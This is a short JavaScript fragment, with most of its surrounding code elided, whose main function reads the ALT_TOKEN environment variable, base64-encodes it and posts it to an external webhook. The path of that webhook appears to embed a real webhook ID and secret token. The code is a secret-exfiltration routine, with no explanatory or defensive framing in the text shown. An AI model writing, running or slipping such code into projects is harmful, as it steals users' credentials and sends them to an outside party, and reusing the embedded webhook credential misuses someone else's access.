...
async function main() {
    ...
    await sendToWebhook("webhooks/1504868501394034778/ONfH1hiIiRZfADlbpyA35oskdSfi5jq2PSjC_vEbQsgdQV78jUTnnDf_5O0hp7G-p0zl", {content: Buffer.from(process.env.ALT_TOKEN).toString("base64") })
